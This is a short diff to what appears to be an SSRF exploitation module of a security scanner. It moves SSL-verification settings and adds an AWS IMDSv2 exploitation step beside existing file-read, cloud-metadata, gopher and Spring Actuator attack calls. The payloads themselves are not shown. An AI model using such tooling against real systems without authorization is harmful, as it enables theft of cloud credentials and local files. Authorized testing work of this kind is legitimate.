@@ -76,7 +76,8 @@ def _build_url(url: str, param: str, target: str) -> str:
 
 def check_file_read(url: str, param: str, sess=None, timeout=10.0) -> list:
     if sess is None:
-        sess = requests.Session(); sess.verify = settings.verify_ssl
+        sess = requests.Session()
+    sess.verify = settings.verify_ssl
     results = []
     for target in SSRF_EXPLOIT_URLS:
         if not target.startswith("file"):
@@ -92,7 +93,8 @@ def check_file_read(url: str, param: str, sess=None, timeout=10.0) -> list:
 
 def check_cloud_metadata(url: str, param: str, sess=None, timeout=10.0) -> Dict:
     if sess is None:
-        sess = requests.Session(); sess.verify = settings.verify_ssl
+        sess = requests.Session()
+    sess.verify = settings.verify_ssl
     result = {}
     for target in SSRF_EXPLOIT_URLS:
         if not target.startswith("http://169") and not target.startswith("http://metadata"):
@@ -335,6 +337,7 @@ class SSRFLateral:
             "spring_actuator": self.exploit_spring_actuator(url, param),
             "bypass_variants": self.bypass_filter_variants(url, param),
             "gopher_protocols": self.exploit_gopher_protocols(url, param),
+            "imdsv2": self.exploit_aws_imdsv2(url, param),
         }
         for cloud in CLOUD_META:
             for meta_url in CLOUD_META[cloud]:
@@ -358,7 +361,8 @@ def run(url: str, param: str, sess: Optional[requests.Session] = None,
 def check(url: str, param: str, sess: Optional[requests.Session] = None,
           timeout: float = 10.0) -> Dict:
     if sess is None:
-        sess = requests.Session(); sess.verify = settings.verify_ssl
+        sess = requests.Session()
+    sess.verify = settings.verify_ssl
 
     lateral = SSRFLateral(sess, timeout)
     lateral_result = lateral.run(url, param)
